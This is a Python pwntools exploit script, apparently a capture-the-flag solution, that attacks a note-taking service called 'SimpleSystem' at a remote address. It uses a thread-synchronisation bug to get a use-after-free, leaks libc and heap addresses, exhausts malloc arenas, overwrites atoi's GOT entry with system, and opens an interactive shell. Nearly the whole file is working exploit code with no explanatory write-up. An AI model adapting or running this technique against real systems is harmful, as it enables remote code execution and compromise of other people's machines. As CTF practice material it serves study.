from pwn import *
from time import sleep

#r = process("./SimpleSystem", env={"LD_PRELOAD":"./libc-2.23.so"})
r = remote("192.46.228.70", 33337)
b = ELF("./SimpleSystem", checksec=False)
l = ELF("./libc-2.23.so", checksec=False)


def signup(fullname, username, password):
    r.sendlineafter("choice: \n", "2")
    r.sendlineafter("name:\n", fullname)
    r.sendlineafter("Username:\n", username)
    r.sendlineafter("Password:\n", password)

def signin(username, password):
    r.sendlineafter("choice: \n", "1")
    r.sendlineafter("Username:\n", username)
    r.sendlineafter("Password:\n", password)

def add_note(size, content):
    r.sendlineafter("choice: \n", "1")
    r.sendlineafter("Size: \n", str(size))
    r.sendafter("Content: \n", content)

def edit_note(id, content):
    sleep(0.5)
    r.sendline("2")
    r.sendlineafter("id: \n", str(id))
    r.sendafter("content: \n", content)

def show():
    r.sendlineafter("choice: \n", "3")

def sleep_thread(seconds):
    sleep(0.5)
    r.sendline("4")
    r.sendlineafter("Seconds: \n", str(seconds))

def signout_delete():
    r.sendlineafter("choice: \n", "5")

def signout():
    r.sendlineafter("choice: \n", "6")

rndalphas = lambda n: bytes([random.randrange(0x41, 0x5b) for i in range(n)])

user = []
for i in range(10):
    #print(i)
    user.append(rndalphas(10))
    signup(user[i], user[i], user[i])

# Leak libc with synchronization bug -> UAF
signin(user[0], user[0])
sleep_thread(1)
signout_delete()
signin(user[0], user[0])
show()
r.recvuntil("Your name: ")
l.address = u64(r.recv(6) + b'\0'*2) - 0x3c4b78
log.info("libc: {}".format(hex(l.address)))

# Signin again and signout to leave a session there
sleep(1)
r.sendline("6")
signin(user[0], user[0])
signout()

# Overflow maximum number of available arenas with 8 running threads
for i in range(1, 9):
    #print(i)
    signin(user[i], user[i])
    sleep_thread(i + 100)
    signout()

# Synchronization bug -> UAF one session
signin(user[0], user[0])
sleep_thread(2)
signout_delete()
signin(user[0], user[0])
sleep(3)

# Fill all 8 created arenas with 8 notes
r.sendline("1")
r.sendlineafter("Size: \n", str(0x90))
r.sendafter("Content: \n", "0"*8) # note 0
for i in range(1, 8):
    add_note(0x90, chr(i)*8) # note 1 -> 7

# Next note will be in main arena, overwrite freed session -> overwrite full name to leak heap
payload1 = p64(0) + p64(1)
payload1 += p64(0) # sess_id
payload1 += p64(2) + p64(0x100000eee) + p64(0)*3 # mutex lock
payload1 += p64(0x603190) # full name -> leak
add_note(0x90, payload1) # note 8
show()
r.recvuntil("Your name: ")
heap = u64(r.recv(4) + b'\0'*4) - 0x19f0
log.info("heap: {}".format(hex(heap)))

# Edit to point to atoi@GOTS
payload2 = p64(0) + p64(0x90)
payload2 += p64(b.got["atoi"]) # sess_id
payload2 += p64(2) + p64(0x100000eee) + p64(0)*3 # mutex lock
payload2 += p64(0) # full name
payload2 += p64(0)*6 # username
payload2 += p64(1) # note_id
payload2 += p64(heap + 0xe90) # head
payload2 += p64(heap + 0xe90) # tail
edit_note(0, payload2)

# Edit again to overwrite atoi@GOTS
edit_note(0, p64(l.symbols["system"]))

# Get shell
r.sendlineafter("choice: \n", "sh")

r.interactive()